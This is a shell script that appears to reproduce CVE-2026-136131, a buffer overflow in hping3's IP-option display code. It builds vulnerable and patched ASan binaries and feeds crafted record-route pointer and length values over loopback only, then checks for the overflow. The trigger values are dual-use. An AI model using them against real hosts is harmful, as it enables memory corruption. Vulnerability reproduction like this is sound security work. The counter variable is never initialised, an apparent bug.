#!/bin/sh
# Reproducible wire-visible reproduction for CVE-2026-136131.
# Requires: gcc, libpcap headers, sudo -n (loopback raw socket/pcap only).
# All traffic stays on 127.0.0.1/127.0.0.2 on this host.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p evidence
CC=${CC:-gcc}
CFLAGS="-O0 -g -fsanitize=address -fcommon -Wall -Wno-unused -I../compat"
PINNED_SHA=e8ef2dd63b3f7b5e5d87d14a50bdc64c6befc94a8e21801f060708f2dcbb5e7b
FIX_SHA=70f0112d12c52d8661736de85e1a5155ba717ca63b09b471cb7aaa7f0ba846c7
rm -f evidence/wire.failed
pass() { n=$((n+1)); printf 'PASS %02d: %s\n' "$n" "$1"; }
fail() { n=$((n+1)); printf 'FAIL %02d: %s\n' "$n" "$1"; : > evidence/wire.failed; }


# Pinned tree, byte-identical copy of the read-only provisioning checkout.
if [ ! -d hping-src ]; then cp -a ../provision/hping-src hping-src; fi
sha=$(sha256sum hping-src/display_ipopt.c | cut -d' ' -f1)
[ "$sha" = "$PINNED_SHA" ] && pass "real tree display_ipopt.c sha256 $sha" || fail "pinned tree sha $sha"

# Linux lacks the BSD-only net/bpf.h; the sole use is #if-guarded off on Linux.
mkdir -p compat/net
: > compat/net/bpf.h

for d in hping-src fixed-src; do
    if [ "$d" = fixed-src ] && [ ! -d fixed-src ]; then cp -a hping-src fixed-src; fi
    ( cd "$d" || exit 1
      [ -f Makefile ] || ./configure --no-tcl >/dev/null 2>&1
      make clean >/dev/null 2>&1
      make -j4 CCOPT="$CFLAGS" >/dev/null 2>&1 ) || fail "ASan build $d"
done
[ -x hping-src/hping3 ] && pass "vulnerable ASan hping3 built" || fail "no vulnerable binary"
[ -x fixed-src/hping3 ] && pass "fixed ASan hping3 built" || fail "no fixed binary"

fsha=$(sha256sum fixed-src/display_ipopt.c 2>/dev/null | cut -d' ' -f1)
if [ "$fsha" != "$FIX_SHA" ]; then
    cp hping-src/display_ipopt.c fixed-src/display_ipopt.c &&
    patch -s -o /tmp/wire-fixed-display.c fixed-src/display_ipopt.c < ../pinned/fix.patch &&
    cp /tmp/wire-fixed-display.c fixed-src/display_ipopt.c
    fsha=$(sha256sum fixed-src/display_ipopt.c | cut -d' ' -f1)
    ( cd fixed-src && make CCOPT="$CFLAGS" display_ipopt.o >/dev/null 2>&1 &&
      make CCOPT="$CFLAGS" hping3 >/dev/null 2>&1 )
fi
[ "$fsha" = "$FIX_SHA" ] && pass "fix.patch applied to real tree ($fsha)" || fail "fix patch sha $fsha"

attack() { # label binary pointer rrlen expected_rc expected_write
    label=$1; bin=$2; ptr=$3; rr=$4; want_rc=$5; want_write=$6
    out="evidence/wire-$label.out"
    BIN="$bin" sh wire-test.sh "$out" "$ptr" "$rr" >/dev/null 2>&1
    rc=$?
    grep -q "ERROR: AddressSanitizer: global-buffer-overflow" "$out" 2>/dev/null
    asan=$?
    grep -q "WRITE of size $want_write" "$out" 2>/dev/null
    write=$?
    grep -q 'display_ipopt.c:112' "$out" 2>/dev/null
    frame=$?
    if [ "$want_rc" = 1 ]; then
        [ "$rc" -eq 1 ] && [ "$asan" -eq 0 ] && [ "$write" -eq 0 ] && [ "$frame" -eq 0 ] &&
            pass "$label: rc=1, WRITE-$want_write at display_ipopt.c:112" ||
            fail "$label: rc=$rc asan=$asan write=$write frame=$frame"
    else
        [ "$rc" -eq 0 ] && [ "$asan" -ne 0 ] &&
            pass "$label: rc=0, no ASan error" || fail "$label: rc=$rc asan=$asan"
    fi
}

attack attack ./hping-src/hping3 72 255 1 68
attack attack2 ./hping-src/hping3 90 255 1 86
attack repeat ./hping-src/hping3 72 255 1 68
attack valid-rr ./hping-src/hping3 8 39 0 0
attack fixed-attack ./fixed-src/hping3 72 255 0 0

printf 'WIRE SUMMARY: %s checks run\n' "$n"
[ -f evidence/wire.failed ] && exit 1
exit 0
